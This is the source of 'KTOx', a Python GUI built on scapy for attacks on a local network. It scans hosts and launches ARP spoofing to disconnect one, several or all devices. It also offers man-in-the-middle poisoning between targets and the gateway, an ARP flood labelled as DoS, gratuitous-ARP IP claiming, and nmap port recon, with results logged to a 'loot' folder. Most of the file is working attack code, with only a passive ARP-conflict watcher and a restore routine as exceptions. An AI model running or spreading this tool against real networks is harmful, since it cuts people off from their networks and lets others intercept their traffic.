#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# ktox_gui.py — KTOx GUI | Cyberpunk Blood-Red | CustomTkinter

import os, sys, threading, time, socket, json, math, random
from datetime import datetime
import tkinter as tk
from tkinter import ttk, scrolledtext

try:
    import customtkinter as ctk
except ImportError:
    # Try to find customtkinter in a venv relative to this script
    import subprocess, site
    script_dir = os.path.dirname(os.path.abspath(__file__))
    venv_paths = [
        os.path.join(script_dir, "venv"),
        os.path.join(script_dir, ".venv"),
        os.path.expanduser("~/KTOx/venv"),
        os.path.expanduser("~/ktox/venv"),
    ]
    injected = False
    for vp in venv_paths:
        for pyver in ["python3.13","python3.12","python3.11","python3.10","python3.9"]:
            sp = os.path.join(vp, "lib", pyver, "site-packages")
            if os.path.isdir(sp):
                sys.path.insert(0, sp)
                try:
                    import customtkinter as ctk
                    injected = True
                    break
                except ImportError:
                    sys.path.pop(0)
        if injected:
            break
    if not injected:
        print("ERROR: customtkinter not found.")
        print("")
        print("It is installed in your venv but sudo uses system Python.")
        print("Fix with ONE of these options:")
        print("")
        print("  Option 1 — run using venv python directly:")
        print("    sudo ./venv/bin/python3 ktox.py --gui")
        print("")
        print("  Option 2 — install into system Python:")
        print("    sudo pip3 install customtkinter --break-system-packages")
        print("")
        sys.exit(1)

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
    from scapy.config import conf as sconf
    sconf.ipv6_enabled = False
    import nmap
    import scan, spoof
except ImportError as e:
    print(f"ERROR: Missing dependency — {e}")
    sys.exit(1)

# ── Palette ───────────────────────────────────────────────────────────────────
BG_DARK   = "#090909"
BG_PANEL  = "#0F0F0F"
BG_CARD   = "#141414"
BG_INPUT  = "#1C1C1C"
FG_WHITE  = "#EFEFEF"
FG_ASH    = "#7A7A7A"
FG_DIM    = "#3A3A3A"
RED_BLOOD = "#C0392B"
RED_EMBER = "#E74C3C"
RED_RUST  = "#7B241C"
RED_HOT   = "#FF3319"
ORANGE    = "#CA6F1E"
GREEN     = "#1E8449"
YELLOW    = "#D4AC0D"

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

# ── Globals ───────────────────────────────────────────────────────────────────
hosts_list          = []
default_interface   = None
default_iface_mac   = None
default_gateway_ip  = None
default_gateway_mac = None
stop_flag           = threading.Event()
LOG_FILE            = None

_OUI = {
    "B8:27:EB":"Raspberry Pi","DC:A6:32":"Raspberry Pi","E4:5F:01":"Raspberry Pi",
    "28:CD:C1":"Raspberry Pi","00:50:56":"VMware","00:0C:29":"VMware",
    "08:00:27":"VirtualBox","00:15:5D":"Microsoft","00:1A:11":"Google",
    "54:60:09":"Google","F4:F5:D8":"Google","74:44:01":"Amazon",
    "FC:A6:67":"Amazon","40:B4:CD":"Amazon","18:B4:30":"Nest",
    "00:17:88":"Philips Hue","B0:4E:26":"Huawei","00:18:82":"Huawei",
    "00:26:5A":"Netgear","C0:3F:0E":"Netgear","20:4E:7F":"Netgear",
    "00:18:E7":"TP-Link","F4:F2:6D":"TP-Link","50:C7:BF":"TP-Link",
    "00:1A:2B":"Asus","90:E6:BA":"Asus","AC:22:0B":"Asus","2C:FD:A1":"Asus",
    "00:04:ED":"Ubiquiti","44:D9:E7":"Ubiquiti","68:72:51":"Ubiquiti",
    "80:2A:A8":"Ubiquiti","00:11:92":"D-Link","90:94:E4":"D-Link",
    "1C:7E:E5":"D-Link","00:23:AE":"Cisco","00:21:6A":"Cisco",
    "00:25:9C":"Cisco","00:1F:C6":"Samsung","30:19:66":"Samsung",
    "50:01:BB":"Samsung","00:17:F2":"Apple","00:1C:B3":"Apple",
    "B8:78:2E":"Apple","F8:27:93":"Apple","3C:07:54":"Apple",
    "A4:B1:97":"Apple","D0:25:98":"Apple","F0:18:98":"Apple",
    "00:22:6B":"Linksys","00:23:69":"Linksys","48:F8:B3":"Linksys",
}

def _resolve_vendor(mac):
    if not mac: return "—"
    return _OUI.get(mac.upper()[:8], "—")

def _resolve_hostname(ip):
    try:
        old = socket.getdefaulttimeout()
        socket.setdefaulttimeout(0.4)
        name = socket.gethostbyaddr(ip)[0]
        socket.setdefaulttimeout(old)
        return name[:20] if name != ip else "—"
    except:
        return "—"

def _retrieve_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except:
        return None

def _get_interface(return_net=False):
    def long2net(a):
        return 32 - int(round(math.log(0xFFFFFFFF - a, 2)))
    def cidr(bn, bm):
        net = scapy.utils.ltoa(bn)
        nm  = long2net(bm)
        return f"{net}/{nm}" if nm >= 16 else None
    routes = [r for r in scapy.config.conf.route.routes
              if r[3] == scapy.config.conf.iface and r[1] != 0xFFFFFFFF]
    nw, nm, _, iface, _, _ = max(routes, key=lambda x: x[1])
    net = cidr(nw, nm)
    if net:
        return net if return_net else iface

def _get_gateway():
    try:
        import netifaces
        gws = netifaces.gateways()
        gw = gws.get("default", {}).get(netifaces.AF_INET, [None])[0]
        if gw: return gw
    except: pass
    try:
        gw = scapy.config.conf.route.route("0.0.0.0")[2]
        if gw and gw != "0.0.0.0": return gw
    except: pass
    try:
        import subprocess as sp
        out = sp.check_output(["ip","route"], text=True)
        for line in out.splitlines():
            if line.startswith("default") and "via" in line:
                p = line.split()
                return p[p.index("via")+1]
    except: pass
    return "unknown"

def _init_log():
    global LOG_FILE
    os.makedirs("ktox_loot", exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    LOG_FILE = os.path.join("ktox_loot", f"gui_{ts}.log")

def _log_event(event, **kw):
    if not LOG_FILE: return
    entry = {"ts": datetime.now().isoformat(), "event": event, "data": kw}
    try:
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except: pass


# ── App ───────────────────────────────────────────────────────────────────────
class KTOxApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("KTOx  —  ARP Network Control Suite")
        self.geometry("960x700")
        self.minsize(820, 580)
        self.configure(fg_color=BG_DARK)
        self.protocol("WM_DELETE_WINDOW", self._on_close)

        self._attacking      = False
        self._attack_targets = []
        self._atk_thread     = None

        _init_log()
        self._build()
        self.after(300, self._auto_init)

    # ── Layout ────────────────────────────────────────────────────────────────
    def _build(self):
        # Banner row
        top = ctk.CTkFrame(self, fg_color=BG_DARK, corner_radius=0)
        top.pack(fill="x")
        ctk.CTkLabel(top, text="▐ KTOX ▌",
                     font=("Courier New", 20, "bold"),
                     text_color=RED_BLOOD).pack(side="left", padx=14, pady=6)
        ctk.CTkLabel(top, text="ARP Network Control Suite  ·  authorized eyes only",
                     font=("Courier New", 10), text_color=FG_ASH).pack(side="left")
        self._lbl_status = ctk.CTkLabel(top, text="● INIT",
                     font=("Courier New", 10, "bold"), text_color=ORANGE)
        self._lbl_status.pack(side="right", padx=14)
        # Red line
        ctk.CTkFrame(self, fg_color=RED_RUST, height=2, corner_radius=0).pack(fill="x")

        # Info bar
        ibar = ctk.CTkFrame(self, fg_color=BG_PANEL, corner_radius=0, height=26)
        ibar.pack(fill="x"); ibar.pack_propagate(False)
        self._ib_iface = self._ibadge(ibar, "IFACE", "—")
        self._ib_gw    = self._ibadge(ibar, "GW",    "—")
        self._ib_mac   = self._ibadge(ibar, "MAC",   "—")
        self._ib_hosts = self._ibadge(ibar, "HOSTS", "0")
        self._ib_log   = self._ibadge(ibar, "LOG",
                                      os.path.basename(LOG_FILE or "—"))
        ctk.CTkFrame(self, fg_color=RED_RUST, height=1, corner_radius=0).pack(fill="x")

        # Body: left controls | right table+log
        body = ctk.CTkFrame(self, fg_color=BG_DARK, corner_radius=0)
        body.pack(fill="both", expand=True)
        body.columnconfigure(0, weight=0)
        body.columnconfigure(1, weight=1)
        body.rowconfigure(0, weight=1)

        left = ctk.CTkScrollableFrame(body, fg_color=BG_PANEL,
                                      corner_radius=0, width=240)
        left.grid(row=0, column=0, sticky="nsew")
        self._build_left(left)

        right = ctk.CTkFrame(body, fg_color=BG_DARK, corner_radius=0)
        right.grid(row=0, column=1, sticky="nsew", padx=(2,0))
        self._build_right(right)

    def _ibadge(self, parent, key, val):
        f = ctk.CTkFrame(parent, fg_color=BG_PANEL, corner_radius=0)
        f.pack(side="left", padx=8, pady=2)
        ctk.CTkLabel(f, text=key+":", font=("Courier New",8,"bold"),
                     text_color=RED_BLOOD).pack(side="left")
        lbl = ctk.CTkLabel(f, text=val, font=("Courier New",8),
                            text_color=FG_ASH)
        lbl.pack(side="left", padx=2)
        return lbl

    def _sect(self, parent, title):
        ctk.CTkLabel(parent, text=f"─ {title} ─",
                     font=("Courier New",9,"bold"),
                     text_color=RED_RUST).pack(anchor="w", padx=8, pady=(12,2))

    def _rbtn(self, parent, label, cmd, color=RED_RUST):
        return ctk.CTkButton(parent, text=label,
            font=("Courier New",10,"bold"),
            fg_color=color, hover_color=RED_BLOOD,
            text_color=FG_WHITE, border_color=RED_EMBER,
            border_width=1, corner_radius=2, command=cmd)

    def _build_left(self, p):
        # Network
        self._sect(p, "NETWORK")
        self._rbtn(p, "⟳  SCAN NETWORK", self._do_scan).pack(fill="x", padx=8, pady=2)

        # Attack mode
        self._sect(p, "ATTACK MODE")
        self._mode = ctk.StringVar(value="kick_one")
        for lbl, val in [
            ("Kick ONE",              "kick_one"),
            ("Kick SOME",             "kick_some"),
            ("Kick ALL",              "kick_all"),
            ("MITM Poison",           "mitm"),
            ("ARP Flood [DoS]",       "flood"),
            ("Gratuitous ARP",        "garp"),
        ]:
            ctk.CTkRadioButton(p, text=lbl, variable=self._mode, value=val,
                font=("Courier New",9), text_color=FG_ASH,
                fg_color=RED_BLOOD, hover_color=RED_EMBER,
                border_color=RED_RUST).pack(anchor="w", padx=14, pady=1)

        # Rate
        self._sect(p, "RATE (pkt/min)")
        self._rate = ctk.CTkEntry(p, font=("Courier New",10),
            fg_color=BG_INPUT, border_color=RED_RUST,
            text_color=FG_WHITE, placeholder_text="6")
        self._rate.insert(0, "6")
        self._rate.pack(fill="x", padx=8, pady=2)

        # Packet cap
        self._sect(p, "PACKET CAP (0=unlimited)")
        self._cap = ctk.CTkEntry(p, font=("Courier New",10),
            fg_color=BG_INPUT, border_color=RED_RUST,
            text_color=FG_WHITE, placeholder_text="0")
        self._cap.insert(0, "0")
        self._cap.pack(fill="x", padx=8, pady=2)

        # GARP IP
        self._sect(p, "GARP CLAIM IP")
        self._garp_ip = ctk.CTkEntry(p, font=("Courier New",10),
            fg_color=BG_INPUT, border_color=RED_RUST,
            text_color=FG_WHITE, placeholder_text="IP to claim")
        self._garp_ip.pack(fill="x", padx=8, pady=2)

        # Targets
        self._sect(p, "TARGETS (idx / IP)")
        self._targets = ctk.CTkEntry(p, font=("Courier New",10),
            fg_color=BG_INPUT, border_color=RED_RUST,
            text_color=FG_WHITE, placeholder_text="0,1,2 or IP")
        self._targets.pack(fill="x", padx=8, pady=2)
        self._rbtn(p, "◎ USE TABLE SELECTION",
                   self._use_selection, color="#1A1A1A").pack(fill="x", padx=8, pady=2)

        # Launch / Stop
        self._sect(p, "CONTROL")
        self._btn_launch = self._rbtn(p, "▶  LAUNCH ATTACK", self._launch)
        self._btn_launch.pack(fill="x", padx=8, pady=2)
        ctk.CTkButton(p, text="■  STOP & RE-ARP",
            font=("Courier New",10,"bold"),
            fg_color=BG_INPUT, hover_color=RED_RUST,
            text_color=FG_ASH, border_color=RED_RUST,
            border_width=1, corner_radius=2,
            command=self._stop).pack(fill="x", padx=8, pady=2)

        # Passive
        self._sect(p, "PASSIVE / RECON")
        self._rbtn(p, "⚡ ARP Watch",         self._arp_watch).pack(fill="x", padx=8, pady=2)
        self._rbtn(p, "◉  Target Recon",      self._recon).pack(fill="x", padx=8, pady=2)
        self._rbtn(p, "▣  ARP Snapshot",      self._snapshot).pack(fill="x", padx=8, pady=2)

    def _build_right(self, parent):
        parent.rowconfigure(0, weight=3)
        parent.rowconfigure(1, weight=2)
        parent.columnconfigure(0, weight=1)

        # Host table card
        tc = ctk.CTkFrame(parent, fg_color=BG_CARD, corner_radius=0)
        tc.grid(row=0, column=0, sticky="nsew", pady=(2,1))
        tc.rowconfigure(1, weight=1)
        tc.columnconfigure(0, weight=1)

        hdr = ctk.CTkFrame(tc, fg_color=BG_CARD, corner_radius=0)
        hdr.grid(row=0, column=0, sticky="ew", padx=6, pady=(6,2))
        ctk.CTkLabel(hdr, text="◈ HOST TABLE",
                     font=("Courier New",10,"bold"),
                     text_color=RED_BLOOD).pack(side="left")
        ctk.CTkFrame(tc, fg_color=RED_RUST, height=1,
                     corner_radius=0).grid(row=0, column=0, sticky="ew",
                                           padx=4, pady=(28,0))

        tf = tk.Frame(tc, bg=BG_CARD)
        tf.grid(row=1, column=0, sticky="nsew", padx=4, pady=4)
        tf.rowconfigure(0, weight=1)
        tf.columnconfigure(0, weight=1)

        sty = ttk.Style()
        sty.theme_use("clam")
        sty.configure("K.Treeview",
            background=BG_CARD, fieldbackground=BG_CARD,
            foreground=FG_WHITE, rowheight=19,
            font=("Courier New",9), borderwidth=0, relief="flat")
        sty.configure("K.Treeview.Heading",
            background=BG_DARK, foreground=RED_BLOOD,
            font=("Courier New",9,"bold"), borderwidth=0, relief="flat")
        sty.map("K.Treeview",
            background=[("selected", RED_RUST)],
            foreground=[("selected", FG_WHITE)])

        cols = ("#","IP","MAC","VENDOR","HOST","ST")
        self._tree = ttk.Treeview(tf, columns=cols, show="headings",
                                  style="K.Treeview", selectmode="extended")
        for col, w in zip(cols, [28,115,135,100,110,36]):
            self._tree.heading(col, text=col)
            self._tree.column(col, width=w, minwidth=w, anchor="w")

        vsb = ttk.Scrollbar(tf, orient="vertical", command=self._tree.yview)
        self._tree.configure(yscrollcommand=vsb.set)
        self._tree.grid(row=0, column=0, sticky="nsew")
        vsb.grid(row=0, column=1, sticky="ns")

        # Log pane
        lc = ctk.CTkFrame(parent, fg_color=BG_CARD, corner_radius=0)
        lc.grid(row=1, column=0, sticky="nsew", pady=(1,2))
        lc.rowconfigure(1, weight=1)
        lc.columnconfigure(0, weight=1)

        ctk.CTkLabel(lc, text="◈ OUTPUT",
                     font=("Courier New",10,"bold"),
                     text_color=RED_BLOOD).grid(row=0, column=0,
                                                sticky="w", padx=8, pady=(6,0))
        ctk.CTkFrame(lc, fg_color=RED_RUST, height=1,
                     corner_radius=0).grid(row=0, column=0,
                                           sticky="ew", padx=4, pady=(24,0))

        self._out = scrolledtext.ScrolledText(lc,
            font=("Courier New",9), bg=BG_CARD, fg=FG_ASH,
            insertbackground=RED_BLOOD, relief="flat",
            borderwidth=0, state="disabled")
        self._out.grid(row=1, column=0, sticky="nsew", padx=4, pady=4)

        for tag, col in [("red",RED_EMBER),("green",GREEN),
                         ("yellow",YELLOW),("orange",ORANGE),
                         ("white",FG_WHITE),("dim",FG_DIM)]:
            self._out.tag_config(tag, foreground=col)

    # ── Output helpers ────────────────────────────────────────────────────────
    def _log(self, msg, tag="dim"):
        def _w():
            self._out.configure(state="normal")
            ts = datetime.now().strftime("%H:%M:%S")
            self._out.insert("end", f"[{ts}]  {msg}\n", tag)
            self._out.see("end")
            self._out.configure(state="disabled")
        self.after(0, _w)

    def _setstatus(self, txt, col=FG_ASH):
        self.after(0, lambda: self._lbl_status.configure(text=txt, text_color=col))

    # ── Init ──────────────────────────────────────────────────────────────────
    def _auto_init(self):
        def _run():
            global default_interface, default_gateway_ip, default_iface_mac
            self._setstatus("● DETECTING", ORANGE)
            try:
                default_interface = _get_interface()
                self._log(f"Interface: {default_interface}", "green")
                self.after(0, lambda: self._ib_iface.configure(text=default_interface))

                default_gateway_ip = _get_gateway()
                self._log(f"Gateway:   {default_gateway_ip}", "green")
                self.after(0, lambda: self._ib_gw.configure(text=default_gateway_ip))

                default_iface_mac = get_if_hwaddr(default_interface)
                self._log(f"MAC:       {default_iface_mac}", "green")
                self.after(0, lambda: self._ib_mac.configure(text=default_iface_mac))

                self._log("Scanning network...", "dim")
                self._scan_internal()
                self._setstatus("● READY", GREEN)
            except Exception as ex:
                self._log(f"Init error: {ex}", "red")
                self._setstatus("● ERROR", RED_EMBER)
        threading.Thread(target=_run, daemon=True).start()

    # ── Scan ──────────────────────────────────────────────────────────────────
    def _do_scan(self):
        def _run():
            self._setstatus("● SCANNING", ORANGE)
            self._log("Scanning...", "dim")
            self._scan_internal()
            self._setstatus("● READY", GREEN)
        threading.Thread(target=_run, daemon=True).start()

    def _scan_internal(self):
        global hosts_list, default_gateway_mac
        try:
            hosts_list = scan.scanNetwork(_get_interface(True))
            default_gateway_mac = None
            for h in hosts_list:
                if h[0] == default_gateway_ip:
                    default_gateway_mac = h[1]
            if not default_gateway_mac and default_gateway_ip:
                default_gateway_mac = _retrieve_mac(default_gateway_ip)
            self._log(f"Found {len(hosts_list)} host(s).", "green")
            self.after(0, lambda: self._ib_hosts.configure(text=str(len(hosts_list))))
            self.after(0, self._fill_tree)
            _log_event("SCAN_COMPLETE", count=len(hosts_list))
        except Exception as ex:
            self._log(f"Scan error: {ex}", "red")

    def _fill_tree(self):
        self._tree.delete(*self._tree.get_children())
        for i, h in enumerate(hosts_list):
            ip  = h[0]; mac = h[1]
            gw  = ip == default_gateway_ip
            self._tree.insert("", "end",
                values=(i, ip, mac,
                        _resolve_vendor(mac),
                        _resolve_hostname(ip),
                        "GW" if gw else "OK"),
                tags=("gw" if gw else "ok",))
        self._tree.tag_configure("gw", foreground=YELLOW)
        self._tree.tag_configure("ok", foreground=FG_WHITE)

    # ── Target helpers ────────────────────────────────────────────────────────
    def _use_selection(self):
        sel = self._tree.selection()
        if not sel:
            self._log("No rows selected.", "orange"); return
        idxs = [self._tree.item(s,"values")[0] for s in sel]
        self._targets.delete(0,"end")
        self._targets.insert(0, ",".join(idxs))
        self._log(f"Targets: {','.join(idxs)}", "yellow")

    def _parse_targets(self, mode):
        if mode == "kick_all":
            return [(h[0],h[1]) for h in hosts_list if h[0] != default_gateway_ip]
        if mode == "garp": return []
        raw = self._targets.get().strip()
        if not raw:
            self._log("No targets specified.", "orange"); return None
        out = []
        for p in raw.split(","):
            p = p.strip()
            if p.isdigit():
                idx = int(p)
                if idx < len(hosts_list):
                    ip  = hosts_list[idx][0]
                    mac = hosts_list[idx][1] or _retrieve_mac(ip)
                    out.append((ip, mac))
            else:
                out.append((p, _retrieve_mac(p)))
        return out

    # ── Attack ────────────────────────────────────────────────────────────────
    def _launch(self):
        if self._attacking:
            self._log("Already attacking. Stop first.", "orange"); return
        if not hosts_list:
            self._log("Scan first.", "orange"); return

        mode = self._mode.get()
        try: ppm = int(self._rate.get() or "6")
        except: ppm = 6
        try: cap = int(self._cap.get() or "0")
        except: cap = 0

        if mode == "garp":   self._do_garp();          return
        if mode == "flood":  self._do_flood(ppm, cap); return

        targets = self._parse_targets(mode)
        if not targets: return

        self._attack_targets = targets
        ip_str = ", ".join(ip for ip,_ in targets)
        self._log(f"▶ {mode.upper()}  →  {ip_str}  @{ppm}ppm", "red")
        _log_event("ATTACK_START", mode=mode, targets=ip_str)

        stop_flag.clear()
        self._attacking = True
        self._setstatus("● ATTACKING", RED_HOT)
        # interval per target so rate is accurate regardless of target count
        interval = 60.0 / float(ppm)
        cap_str = str(cap) if cap > 0 else "∞"
        self._log(f"  Rate: {ppm}ppm/target  Cap: {cap_str}", "dim")

        def _loop():
            sent = 0
            while not stop_flag.is_set():
                for ip, mac in targets:
                    if stop_flag.is_set(): break
                    if mac:
                        try:
                            if mode == "mitm":
                                gm = default_gateway_mac or _retrieve_mac(default_gateway_ip)
                                sendp(Ether(dst=mac)/ARP(op=2,
                                    pdst=ip, hwdst=mac,
                                    psrc=default_gateway_ip,
                                    hwsrc=default_iface_mac), verbose=False)
                                sendp(Ether(dst=gm)/ARP(op=2,
                                    pdst=default_gateway_ip, hwdst=gm,
                                    psrc=ip, hwsrc=default_iface_mac), verbose=False)
                            else:
                                spoof.sendPacket(default_iface_mac,
                                                 default_gateway_ip, ip, mac)
                            sent += 1
                            if cap > 0 and sent >= cap:
                                stop_flag.set()
                                self._log(f"Packet cap reached ({cap}).", "yellow")
                                break
                        except: pass
                    time.sleep(interval)
                self.after(0, lambda s=sent:
                    self._setstatus(f"● ATK {s}pkt", RED_HOT))
            _log_event("ATTACK_END", mode=mode, sent=sent)
        self._atk_thread = threading.Thread(target=_loop, daemon=True)
        self._atk_thread.start()

    def _do_flood(self, ppm, cap=0):
        raw = self._targets.get().strip().split(",")[0].strip()
        if raw.isdigit():
            idx = int(raw)
            raw = hosts_list[idx][0] if idx < len(hosts_list) else raw
        target_ip  = raw
        target_mac = _retrieve_mac(target_ip)
        if not target_mac:
            self._log(f"Cannot resolve MAC for {target_ip}", "red"); return
        pps      = max(1, ppm * 10)
        interval = 1.0 / pps
        self._log(f"▶ ARP FLOOD  →  {target_ip}  @{pps}pps", "red")
        _log_event("FLOOD_START", target=target_ip, pps=pps)
        stop_flag.clear(); self._attacking = True
        self._setstatus("● FLOODING", RED_HOT)
        sent = [0]
        def _loop():
            while not stop_flag.is_set():
                fi = ".".join(str(random.randint(1,254)) for _ in range(4))
                fm = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
                try:
                    sendp(Ether(dst=target_mac)/ARP(op=2,
                        pdst=target_ip, hwdst=target_mac,
                        psrc=fi, hwsrc=fm), verbose=False)
                    sent[0] += 1
                    if cap > 0 and sent[0] >= cap:
                        stop_flag.set()
                        self._log(f"Flood cap reached ({cap}).", "yellow")
                        break
                except: pass
                time.sleep(interval)
                if sent[0] % 100 == 0:
                    self.after(0, lambda s=sent[0]:
                        self._setstatus(f"● FLD {s}pkt", RED_HOT))
            _log_event("FLOOD_END", sent=sent[0])
        self._atk_thread = threading.Thread(target=_loop, daemon=True)
        self._atk_thread.start()

    def _do_garp(self):
        ip = self._garp_ip.get().strip()
        if not ip:
            self._log("Enter CLAIM IP.", "orange"); return
        mac = default_iface_mac
        self._log(f"▶ GARP  →  {ip} is-at {mac}", "yellow")
        _log_event("GARP_START", claim_ip=ip)
        garp = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac)/ARP(
            op=2, psrc=ip, hwsrc=mac, pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
        def _run():
            for i in range(10):
                try: sendp(garp, verbose=False)
                except: pass
                self._log(f"  GARP [{i+1}/10] → {ip}", "yellow")
                time.sleep(1.0)
            self._log("GARP complete.", "green")
        threading.Thread(target=_run, daemon=True).start()

    def _stop(self):
        if not self._attacking:
            self._log("No active attack.", "dim"); return
        stop_flag.set()
        self._attacking = False
        self._setstatus("● RE-ARPING", ORANGE)
        self._log("Stopping — restoring ARP tables...", "orange")
        targets = list(self._attack_targets)
        def _rearp():
            for _ in range(10):
                for ip, mac in targets:
                    if mac and default_gateway_mac:
                        try: spoof.sendPacket(default_gateway_mac,
                                              default_gateway_ip, ip, mac)
                        except: pass
                time.sleep(0.2)
            self._log("ARP tables restored.", "green")
            self._setstatus("● READY", GREEN)
            _log_event("REARP_COMPLETE")
            self._attack_targets = []
        threading.Thread(target=_rearp, daemon=True).start()

    # ── Passive ───────────────────────────────────────────────────────────────
    def _arp_watch(self):
        self._log("ARP Watch started — Ctrl+Stop to end.", "yellow")
        self._setstatus("● ARP WATCH", YELLOW)
        known = {}
        stop_flag.clear()
        def _sniff(pkt):
            if ARP in pkt and pkt[ARP].op == 2:
                ip  = pkt[ARP].psrc
                mac = pkt[ARP].hwsrc
                if ip in known:
                    if known[ip] != mac:
                        self._log(f"⚡ CONFLICT  {ip}  {known[ip]}→{mac}", "red")
                        _log_event("ARP_CONFLICT", ip=ip, old=known[ip], new=mac)
                        known[ip] = mac
                else:
                    known[ip] = mac
                    self._log(f"  + {ip}  {mac}", "dim")
        def _run():
            sniff(prn=_sniff, filter="arp", store=0,
                  stop_filter=lambda _: stop_flag.is_set())
            self._log("ARP Watch stopped.", "dim")
            self._setstatus("● READY", GREEN)
        threading.Thread(target=_run, daemon=True).start()

    def _recon(self):
        raw = self._targets.get().strip().split(",")[0].strip()
        if raw.isdigit():
            idx = int(raw)
            raw = hosts_list[idx][0] if idx < len(hosts_list) else raw
        ip = raw
        if not ip:
            self._log("Specify a target IP or index.", "orange"); return
        self._log(f"Recon: {ip}", "yellow")
        def _run():
            mac = _retrieve_mac(ip)
            self._log(f"  MAC:    {mac or 'N/A'}", "white")
            self._log(f"  Vendor: {_resolve_vendor(mac)}", "white")
            self._log(f"  Host:   {_resolve_hostname(ip)}", "white")
            _log_event("RECON", ip=ip, mac=mac)
            try:
                nm = nmap.PortScanner()
                nm.scan(hosts=ip, arguments="-F -T4")
                if ip in nm.all_hosts():
                    for proto in nm[ip].all_protocols():
                        for port in sorted(nm[ip][proto]):
                            info = nm[ip][proto][port]
                            tag  = "green" if info['state']=="open" else "dim"
                            self._log(f"  {port}/{proto}  {info['state']}  {info['name']}", tag)
                else:
                    self._log("  No port data.", "dim")
            except Exception as ex:
                self._log(f"  nmap: {ex}", "orange")
        threading.Thread(target=_run, daemon=True).start()

    def _snapshot(self):
        self._log("ARP table snapshot:", "yellow")
        import subprocess
        try:
            out = subprocess.check_output(["arp","-a"], text=True)
            entries = []
            for line in out.strip().splitlines():
                parts = line.split()
                try:
                    host  = parts[0]
                    ip    = parts[1].strip("()")
                    mac   = parts[3] if len(parts)>3 else "N/A"
                    iface = parts[-1] if len(parts)>5 else "N/A"
                    self._log(f"  {ip}  {mac}  {host}", "white")
                    entries.append({"ip":ip,"mac":mac,"host":host})
                except: pass
            _log_event("ARP_SNAPSHOT", count=len(entries))
            self._log(f"Snapshot: {len(entries)} entries.", "green")
        except Exception as ex:
            self._log(f"arp error: {ex}", "red")

    # ── Close ─────────────────────────────────────────────────────────────────
    def _on_close(self):
        stop_flag.set()
        if self._attacking and self._attack_targets:
            for _ in range(5):
                for ip, mac in self._attack_targets:
                    if mac and default_gateway_mac:
                        try: spoof.sendPacket(default_gateway_mac,
                                              default_gateway_ip, ip, mac)
                        except: pass
                time.sleep(0.1)
        self.destroy()


def launch():
    if os.geteuid() != 0:
        print("ERROR: sudo python3 ktox.py --gui")
        sys.exit(1)
    app = KTOxApp()
    app.mainloop()

if __name__ == "__main__":
    launch()
